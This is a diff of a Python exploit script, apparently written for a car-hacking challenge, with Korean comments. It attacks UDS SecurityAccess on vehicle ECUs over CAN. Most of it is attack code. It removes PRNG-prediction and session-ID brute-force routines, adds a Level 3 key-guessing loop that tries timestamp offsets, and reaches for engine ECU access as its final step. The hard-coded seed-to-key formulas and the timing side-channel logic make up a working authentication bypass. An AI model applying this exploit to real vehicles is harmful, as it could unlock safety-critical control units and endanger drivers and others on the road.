@@ -20,11 +20,9 @@ class GatewayExploit:
         
         self.timing_data = defaultdict(list)
         self.seed_history = []
-        self.prng_state = None
-        self.prng_counter = 0
         
         if not session_id:
-            log.error("Session ID is required!")
+            log.warning("Session ID is required!")
             sys.exit(1)
             
         log.info(f"Gateway exploit initialized - Session: {session_id}")
@@ -53,7 +51,7 @@ class GatewayExploit:
             return conn
             
         except Exception as e:
-            log.error(f"ECU connection failed: {e}")
+            log.warning(f"ECU connection failed: {e}")
             return None
 
     def connect(self):
@@ -82,7 +80,7 @@ class GatewayExploit:
             return True
             
         except Exception as e:
-            log.error(f"Connection setup failed: {e}")
+            log.warning(f"Connection setup failed: {e}")
             return False
     
     def execute_command(self, cmd, timeout=3):
@@ -229,84 +227,6 @@ class GatewayExploit:
         response_time = end_time - start_time
         return response, response_time
     
-    def init_prng(self):
-        """PRNG 상태 초기화"""
-        log.info("Initializing PRNG state...")
-        
-        md5_seed = int(hashlib.md5(self.session_id.encode()).hexdigest()[:8], 16)
-        self.prng_state = md5_seed ^ 0x12345678
-        self.prng_counter = 0
-        
-        log.success(f"Session ID: {self.session_id}")
-        log.success(f"Session MD5: {hashlib.md5(self.session_id.encode()).hexdigest()}")
-        log.success(f"MD5 seed: 0x{md5_seed:08X}")
-        log.success(f"Initial PRNG state: 0x{self.prng_state:08X}")
-        
-        # 디버깅을 위해 첫 몇 개 PRNG 값 미리 계산해서 보여주기
-        log.info("First few PRNG values:")
-        temp_state = self.prng_state
-        for i in range(1, 6):
-            temp_state = ((temp_state * 1103515245 + 12345) & 0x7FFFFFFF)
-            log.info(f"  PRNG[{i}]: 0x{temp_state:08X}")
-    
-    def bruteforce_session_id(self, received_seed, timestamp):
-        """시드를 이용해 세션 ID 브루트포스"""
-        log.info("Brute forcing session ID from seed...")
-        
-        time_factor = timestamp & 0xFF
-        log.info(f"Using time factor: 0x{time_factor:02X}")
-        
-        # 일반적인 세션 ID 패턴들
-        session_patterns = [
-            'infotainment_001', 'infotainment_1', 'ecu_infotainment',
-            'session_001', 'session_1', 'user_session', 
-            'info_ecu', 'entertainment_sys', 'head_unit',
-            'ivi_session', 'hmi_001', 'display_ecu',
-            'test_session', 'debug_session', 'admin_session',
-            'default', 'guest', 'anonymous', 'demo'
-        ]
-        
-        # 현재 세션 ID도 포함
-        if self.session_id not in session_patterns:
-            session_patterns.insert(0, self.session_id)
-        
-        for candidate_id in session_patterns:
-            log.info(f"Testing session ID: {candidate_id}")
-            
-            # PRNG 초기화
-            md5_seed = int(hashlib.md5(candidate_id.encode()).hexdigest()[:8], 16)
-            prng_state = md5_seed ^ 0x12345678
-            
-            # 첫 번째 PRNG 값
-            prng_state = ((prng_state * 1103515245 + 12345) & 0x7FFFFFFF)
-            
-            # 시드 계산
-            expected_seed = (prng_state ^ (time_factor << 16)) & 0xFFFFFFFF
-            
-            log.debug(f"  MD5: {hashlib.md5(candidate_id.encode()).hexdigest()[:8]}")
-            log.debug(f"  PRNG: 0x{prng_state:08X}")
-            log.debug(f"  Expected seed: 0x{expected_seed:08X}")
-            
-            if expected_seed == received_seed:
-                log.success(f"✓ Found correct session ID: {candidate_id}")
-                
-                # 세션 ID 업데이트
-                self.session_id = candidate_id
-                self.prng_state = md5_seed ^ 0x12345678
-                self.prng_counter = 0
-                
-                return True
-        
-        log.error("Could not find matching session ID")
-        return False
-    
-    def next_prng(self):
-        """다음 PRNG 값 생성"""
-        self.prng_counter += 1
-        self.prng_state = ((self.prng_state * 1103515245 + 12345) & 0x7FFFFFFF)
-        log.debug(f"PRNG[{self.prng_counter}]: 0x{self.prng_state:08X}")
-        return self.prng_state
-    
     def request_seed(self, level):
         """시드 요청 (멀티프레임 응답 처리)"""
         log.info(f"Requesting seed for security level 0x{level:02X}")
@@ -342,10 +262,10 @@ class GatewayExploit:
                 0x37: "Required time delay not expired"
             }
             error_name = error_names.get(error_code, f"Unknown 0x{error_code:02X}")
-            log.error(f"UDS Error: {error_name}")
+            log.warning(f"UDS Error: {error_name}")
         
         else:
-            log.error(f"No valid response received (got {len(response) if response else 0} bytes)")
+            log.warning(f"No valid response received (got {len(response) if response else 0} bytes)")
             if response:
                 log.debug(f"Response data: {response.hex()}")
         
@@ -358,8 +278,6 @@ class GatewayExploit:
         # 키를 4바이트로 패킹
         key_data = struct.pack('>I', key)
         
-        # PCI = 1 + 1 + 4 = 6 (SID + Sub + Key)
-        # 전체 프레임: [06][27][02][AABBCCDD]
         log.debug(f"Key data: {key_data.hex()}")
         
         response, response_time = self.send_uds_request(0x27, level + 1, key_data)
@@ -384,184 +302,10 @@ class GatewayExploit:
                         0x37: "Required time delay not expired"
                     }
                     error_name = error_names.get(error_code, f"Unknown 0x{error_code:02X}")
-                    log.warning(f"UDS Error: {error_name}")  # log.error를 log.warning으로 변경
+                    log.warning(f"UDS Error: {error_name}")
                 
         log.warning(f"✗ Key rejected (time: {response_time:.4f}s)")
         return False
-    
-    def calculate_level1_key(self, seed, timestamp):
-        """Level 1 키 계산 - PRNG 역산으로 정확한 타임스탬프 찾기"""
-        log.info("Calculating Level 1 key...")
-        log.info("Reverse engineering seed generation using PRNG...")
-        
-        # 현재 PRNG 상태에서 다음 값 계산 (시드 생성시 사용된 값)
-        predicted_prng = self.next_prng()
-        log.info(f"Expected PRNG value: 0x{predicted_prng:08X}")
-        log.info(f"Received seed: 0x{seed:08X}")
-        
-        # 시드 생성 공식: seed = (PRNG ^ (time_factor << 16)) & 0xFFFFFFFF
-        # 역산: time_factor = (seed ^ PRNG) >> 16
-        
-        xor_result = seed ^ predicted_prng
-        time_factor_from_seed = (xor_result >> 16) & 0xFFFF
-        
-        log.info(f"Seed XOR PRNG: 0x{xor_result:08X}")
-        log.info(f"Time factor from seed XOR: 0x{time_factor_from_seed:04X}")
-        
-        # 타임스탬프 역산: timestamp & 0xFF = time_factor & 0xFF
-        target_time_factor = time_factor_from_seed & 0xFF
-        log.info(f"Target time factor (lower 8 bits): 0x{target_time_factor:02X}")
-        
-        # 현재 시간 기준으로 가능한 타임스탬프들 확인
-        current_time = int(time.time())
-        
-        possible_timestamps = []
-        for time_offset in range(0, 60):  # 60초 전까지
-            test_timestamp = current_time - time_offset
-            if (test_timestamp & 0xFF) == target_time_factor:
-                possible_timestamps.append(test_timestamp)
-                log.info(f"Matching timestamp: {test_timestamp} (offset={time_offset}s, factor=0x{test_timestamp & 0xFF:02X})")
-        
-        if not possible_timestamps:
-            log.warning("No matching timestamp found!")
-            log.info("Trying brute force approach...")
-            
-            # 브루트포스로 모든 가능한 time_factor 시도
-            for tf in range(256):
-                test_seed = (predicted_prng ^ (tf << 16)) & 0xFFFFFFFF
-                if test_seed == seed:
-                    log.success(f"Found time factor by brute force: 0x{tf:02X}")
-                    target_time_factor = tf
-                    # 이 time_factor와 일치하는 최근 타임스탬프 찾기
-                    best_timestamp = current_time
-                    while (best_timestamp & 0xFF) != target_time_factor:
-                        best_timestamp -= 1
-                        if current_time - best_timestamp > 3600:  # 1시간 이상 차이나면 중단
-                            best_timestamp = current_time
-                            break
-                    possible_timestamps = [best_timestamp]
-                    break
-            else:
-                log.error("Could not find matching PRNG pattern!")
-                # 마지막 수단: 현재 시간 사용
-                best_timestamp = current_time
-                target_time_factor = best_timestamp & 0xFF
-        else:
-            # 가장 가능성 높은 타임스탬프 선택 (가장 최근 것)
-            best_timestamp = possible_timestamps[0]
-            target_time_factor = best_timestamp & 0xFF
-        
-        log.info(f"Selected timestamp: {best_timestamp}")
-        log.info(f"Final time factor: 0x{target_time_factor:02X}")
-        
-        # 시드 생성 검증
-        verification_seed = (predicted_prng ^ (target_time_factor << 16)) & 0xFFFFFFFF
-        log.info(f"Verification seed: 0x{verification_seed:08X}")
-        
-        if verification_seed == seed:
-            log.success("✓ Seed generation verified!")
-        else:
-            log.warning(f"✗ Seed verification failed!")
-            log.warning(f"Expected: 0x{verification_seed:08X}, Got: 0x{seed:08X}")
-            log.warning("Using received seed anyway...")
-        
-        # Level 1 키 계산: (seed ^ 0xA5A5A5A5) + (timestamp & 0xFF)
-        key = ((seed ^ 0xA5A5A5A5) + target_time_factor) & 0xFFFFFFFF
-        
-        log.info(f"Level 1 key calculation:")
-        log.info(f"  Seed: 0x{seed:08X}")
-        log.info(f"  XOR constant: 0xA5A5A5A5")
-        log.info(f"  After XOR: 0x{(seed ^ 0xA5A5A5A5):08X}")
-        log.info(f"  Time factor: 0x{target_time_factor:02X}")
-        log.info(f"  Final key: 0x{key:08X}")
-        
-        log.success(f"Level 1 key: 0x{key:08X}")
-        return key
-    
-    def calculate_level3_key(self, seed, timestamp):
-        """Level 3 키 계산 (PRNG 검증 없이)"""
-        log.info("Calculating Level 3 key...")
-        
-        log.info(f"Level 3 key calculation:")
-        log.info(f"  Seed: 0x{seed:08X}")
-        log.info(f"  Timestamp: {timestamp}")
-        
-        # Level 3 키 계산
-        step1 = seed ^ 0x5A5A5A5A
-        step2 = ((step1 << 3) | (step1 >> 29)) & 0xFFFFFFFF
-        step3 = step2 + ((timestamp & 0xFFFF) * 0x9E3779B9)
-        key = step3 & 0xFFFFFFFF
-        
-        log.info(f"Key calculation steps:")
-        log.info(f"  Step 1 (XOR): 0x{step1:08X}")
-        log.info(f"  Step 2 (ROL3): 0x{step2:08X}")
-        log.info(f"  Step 3 (final): 0x{key:08X}")
-        
-        log.success(f"Level 3 key: 0x{key:08X}")
-        return key
-    
-    def calculate_level3_key(self, seed, timestamp):
-        """Level 3 키 계산"""
-        log.info("Calculating Level 3 key...")
-        
-        predicted_prng = self.next_prng()
-        
-        # Level 3 시드 생성 분석
-        session_time = int(timestamp - self.seed_history[0]['timestamp'])
-        time_factor = (timestamp ^ session_time) & 0xFFFF
-        expected_seed = (predicted_prng ^ (time_factor << 8) ^ 0xCAFEBABE) & 0xFFFFFFFF
-        
-        log.info(f"Level 3 seed analysis:")
-        log.info(f"  Received: 0x{seed:08X}")
-        log.info(f"  PRNG[{self.prng_counter}]: 0x{predicted_prng:08X}")
-        log.info(f"  Session time: {session_time}s")
-        log.info(f"  Time factor: 0x{time_factor:04X}")
-        log.info(f"  Expected: 0x{expected_seed:08X}")
-        
-        if expected_seed != seed:
-            log.error("✗ Level 3 seed prediction failed!")
-            return None
-        
-        log.success("✓ Level 3 seed prediction confirmed!")
-        
-        # Level 3 키 계산
-        step1 = seed ^ 0x5A5A5A5A
-        step2 = ((step1 << 3) | (step1 >> 29)) & 0xFFFFFFFF
-        step3 = step2 + ((timestamp & 0xFFFF) * 0x9E3779B9)
-        key = step3 & 0xFFFFFFFF
-        
-        log.info(f"Key calculation steps:")
-        log.info(f"  Step 1 (XOR): 0x{step1:08X}")
-        log.info(f"  Step 2 (ROL3): 0x{step2:08X}")
-        log.info(f"  Step 3 (final): 0x{key:08X}")
-        
-        log.success(f"Level 3 key: 0x{key:08X}")
-        return key
-    
-    def calculate_level5_key(self, seed, timestamp):
-        """Level 5 키 계산 (MD5 기반)"""
-        log.info("Calculating Level 5 key...")
-        
-        # MD5 기반 키 계산
-        data = struct.pack('>II', seed, timestamp)
-        hash_input = data + self.session_id.encode()
-        hash_obj = hashlib.md5(hash_input)
-        hash_bytes = hash_obj.digest()[:4]
-        base_key = struct.unpack('>I', hash_bytes)[0]
-        
-        # 복잡한 변환 과정
-        transform1 = ((base_key ^ 0x12345678) * 0x41C64E6D) & 0xFFFFFFFF
-        transform2 = ((transform1 + 0x3039) >> 1) & 0xFFFFFFFF
-        
-        log.info(f"Level 5 key calculation:")
-        log.info(f"  MD5 input: {hash_input.hex()}")
-        log.info(f"  MD5 hash: {hash_obj.hexdigest()}")
-        log.info(f"  Base key: 0x{base_key:08X}")
-        log.info(f"  Transform1: 0x{transform1:08X}")
-        log.info(f"  Transform2: 0x{transform2:08X}")
-        
-        log.success(f"Level 5 key: 0x{transform2:08X}")
-        return transform2
     
     def attack_level(self, level):
         """특정 레벨 공격 (타임스탬프 역산 적용)"""
@@ -605,30 +349,56 @@ class GatewayExploit:
                 log.warning(f"Attempt {attempt + 1} failed, requesting new seed...")
                 time.sleep(1)  # 잠깐 대기 후 새 시드 요청
             
-            log.error("All attempts failed for Level 1")
+            log.warning("All attempts failed for Level 1")
             return False
             
-        # 다른 레벨들
         elif level == 0x03:
-            seed, timestamp = self.request_seed(level)
-            if seed is None:
-                return False
-            key = self.calculate_level3_key(seed, timestamp)
+            # Level 3 전용 로직: 시드 생성 타이밍 역산
+            log.info("Level 3: Seed generation timestamp reverse engineering...")
             
-        elif level == 0x05:
-            seed, timestamp = self.request_seed(level)
-            if seed is None:
-                return False
-            key = self.calculate_level5_key(seed, timestamp)
+            max_attempts = 3  # 최대 3번의 시드 요청
+            
+            for attempt in range(max_attempts):
+                log.info(f"Attempt {attempt + 1}/{max_attempts}")
+                
+                # 시드 요청
+                seed, current_timestamp = self.request_seed(level)
+                if seed is None:
+                    continue
+                
+                log.info(f"Seed: 0x{seed:08X}, Current time: {current_timestamp}")
+                
+                # Level 1에서 학습한 오프셋 적용 (보통 3-5초 전)
+                likely_offsets = [3, 4, 5, 2, 6, 1, 7, 0, 8, 9, 10]
+                
+                for offset in likely_offsets:
+                    # 시드 생성 시점 추정
+                    seed_generation_time = current_timestamp - offset
+                    
+                    # Level 3 키 계산 공식: ROL3(seed ^ 0x5A5A5A5A) + (timestamp & 0xFFFF) * 0x9E3779B9
+                    step1 = seed ^ 0x5A5A5A5A
+                    step2 = ((step1 << 3) | (step1 >> 29)) & 0xFFFFFFFF
+                    step3 = step2 + ((seed_generation_time & 0xFFFF) * 0x9E3779B9)
+                    key = step3 & 0xFFFFFFFF
+                    
+                    log.info(f"  Testing offset {offset}s: seed_time={seed_generation_time}, key=0x{key:08X}")
+                    
+                    if self.send_key(level, key):
+                        log.success(f"SUCCESS! Offset: {offset}s, Seed timestamp: {seed_generation_time}")
+                        return True
+                    
+                    # 빠른 시도를 위해 대기 시간 단축
+                    time.sleep(0.1)
+                
+                log.warning(f"Attempt {attempt + 1} failed, requesting new seed...")
+                time.sleep(1)  # 잠깐 대기 후 새 시드 요청
+            
+            log.warning("All attempts failed for Level 3")
+            return False
             
         else:
-            log.error(f"Unknown level: 0x{level:02X}")
+            log.warning(f"Unknown level: 0x{level:02X}")
             return False
-        
-        if key is None:
-            return False
-        
-        return self.send_key(level, key)
     
     def test_engine_access(self):
         """엔진 ECU 접근 테스트"""
@@ -677,7 +447,7 @@ class GatewayExploit:
             except:
                 continue
         
-        log.error("No engine ECU response - access denied")
+        log.warning("No engine ECU response - access denied")
         return False
     
     def timing_analysis(self):
@@ -693,16 +463,10 @@ class GatewayExploit:
                 
                 avg_time = sum(t[1] for t in timing_list) / len(timing_list)
                 fast_responses = [t for t in timing_list if t[1] < avg_time - 0.01]
-                slow_responses = [t for t in timing_list if t[1] > avg_time + 0.01]
                 
                 log.info(f"  Average time: {avg_time:.4f}s")
                 if fast_responses:
-                    log.warning(f"  Fast responses (potential correct keys): {len(fast_responses)}")
-                    for key, timing in fast_responses:
-                        log.warning(f"    Key 0x{key:08X}: {timing:.4f}s")
-                
-                if slow_responses:
-                    log.info(f"  Slow responses: {len(slow_responses)}")
+                    log.warning(f"  Fast responses detected: {len(fast_responses)}")
     
     def show_summary(self):
         """공격 결과 요약"""
@@ -731,9 +495,6 @@ class GatewayExploit:
             return False
         
         try:
-            # PRNG 초기화
-            self.init_prng()
-            
             # CAN 인터페이스 확인
             can_check = self.execute_command("ip link show can0")
             if "can0" in can_check:
@@ -750,32 +511,28 @@ class GatewayExploit:
                 if self.attack_level(0x03):
                     log.success("🔓 Level 3 authentication bypassed!")
                     time.sleep(1)
-                    
-                    # Level 5 공격
-                    if self.attack_level(0x05):
-                        log.success("🔓 Level 5 authentication bypassed!")
-                        log.success("🎉 ALL SECURITY LEVELS CRACKED! 🎉")
+
                         
-                        time.sleep(1)
-                        # 엔진 ECU 접근
-                        if self.test_engine_access():
-                            log.success("🏁 ENGINE ECU COMPROMISED! 🏁")
-                            log.success("🏆 CHALLENGE COMPLETED! 🏆")
-                            
-                            self.show_summary()
-                            return True
+                    time.sleep(1)
+                    # 엔진 ECU 접근
+                    if self.test_engine_access():
+                        log.success("🏁 ENGINE ECU COMPROMISED! 🏁")
+                        log.success("🏆 CHALLENGE COMPLETED! 🏆")
+                        
+                        self.show_summary()
+                        return True
             
             # 실패한 경우 타이밍 분석
             self.timing_analysis()
             self.show_summary()
-            log.warning("❌ Exploit failed - not all levels unlocked")  # log.error를 log.warning으로 변경
+            log.warning("❌ Exploit failed - not all levels unlocked")
             return False
             
         except KeyboardInterrupt:
             log.warning("Exploit interrupted by user")
             return False
         except Exception as e:
-            log.warning(f"Exploit failed with error: {e}")  # log.error를 log.warning으로 변경
+            log.warning(f"Exploit failed with error: {e}")
             import traceback
             traceback.print_exc()
             return False
@@ -813,10 +570,10 @@ def main():
         log.success("="*60)
         sys.exit(0)
     else:
-        log.error("\n" + "="*60)
-        log.error("❌ EXPLOIT FAILED")
-        log.error("Check session ID or try manual analysis")
-        log.error("="*60)
+        log.warning("\n" + "="*60)
+        log.warning("❌ EXPLOIT FAILED")
+        log.warning("Check session ID or try manual analysis")
+        log.warning("="*60)
         sys.exit(1)
 
 if __name__ == "__main__":
